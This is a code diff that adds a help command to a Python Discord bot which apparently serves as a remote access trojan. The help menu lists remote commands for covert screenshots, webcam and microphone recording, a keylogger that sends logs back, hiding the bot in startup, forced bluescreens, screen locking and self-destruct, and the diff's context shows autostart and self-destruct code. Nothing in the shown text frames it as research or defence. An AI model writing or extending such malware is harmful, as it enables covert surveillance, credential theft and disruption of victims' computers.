@@ -1133,5 +1133,102 @@ async def self_destruct(ctx, pc_name: str):
         await ctx.send(f"❌ FATAL ERROR: {str(e)}")
         print(f"[KILL ERROR] {traceback.format_exc()}")
 
+@bot.command(name="help")
+async def help_command(ctx):
+    """Show all available commands (only responds from PC with longest uptime)"""
+    
+    uptimes = {}
+    for member in ctx.guild.members:
+        if member.bot:
+            continue
+            
+
+        for role in member.roles:
+            if role.name.lower().endswith("-pc"):  
+                pc_name = role.name.lower()
+                try:
+
+                    uptime = psutil.boot_time()
+                    uptimes[pc_name] = uptime
+                except:
+                    pass
+    
+
+    if uptimes:
+        longest_pc = min(uptimes, key=uptimes.get)
+    else:
+        longest_pc = None
+    
+
+    if longest_pc and longest_pc != get_pc_name():
+        return
+    
+    embed = discord.Embed(
+        title="🤖 Bot Command Help",
+        description="All available commands for system control",
+        color=0x3498db
+    )
+    
+    embed.add_field(
+        name="🖥️ System Commands",
+        value=(
+            "`!systeminfo PC-Name` - Show detailed system info\n"
+            "`!tasklist PC-Name` - List running processes\n"
+            "`!killtask PC-Name ProcessName` - Kill a process\n"
+            "`!startprocess PC-Name \"Path\"` - Start a process\n"
+            "`!stop PC-Name` - Shutdown bot on this PC\n"
+            "`!kill PC-Name` - Completely remove bot (self-destruct)\n"
+            "`!autorun PC-Name` - Hide bot and add to startup"
+        ),
+        inline=False
+    )
+    
+    embed.add_field(
+        name="📸 Media Commands",
+        value=(
+            "`!screenshot PC-Name` - Capture all monitors\n"
+            "`!webcam PC-Name` - Take webcam photo\n"
+            "`!clip PC-Name [Duration]` - Record webcam video\n"
+            "`!recdesktop PC-Name [Duration]` - Record desktop\n"
+            "`!recmicrophone PC-Name [Duration]` - Record microphone"
+        ),
+        inline=False
+    )
+    
+    embed.add_field(
+        name="🎭 Fun Commands",
+        value=(
+            "`!jumpscare PC-Name` - Trigger jumpscare\n"
+            "`!bluescreen PC-Name` - Trigger BSOD\n"
+            "`!rickroll PC-Name` - Rickroll the user\n"
+            "`!lock PC-Name` - Lock all monitors\n"
+            "`!unlock PC-Name` - Unlock system"
+        ),
+        inline=False
+    )
+    
+    embed.add_field(
+        name="⌨️ Keylogger Commands",
+        value=(
+            "`!keyloggerstart PC-Name` - Start keylogger\n"
+            "`!keyloggerstop PC-Name` - Stop and send logs\n"
+            "`!keyloggerstatus PC-Name` - Show keylogger status"
+        ),
+        inline=False
+    )
+    
+    embed.add_field(
+        name="🛠️ Utility",
+        value=(
+            "`!clean` - Clean the channel (750 messages)\n"
+            "`!help` - Show this help message"
+        ),
+        inline=False
+    )
+    
+    embed.set_footer(text=f"Requested by {ctx.author.display_name}")
+    
+    await ctx.send(embed=embed)
+
 setup_autostart()
 bot.run(TOKEN)
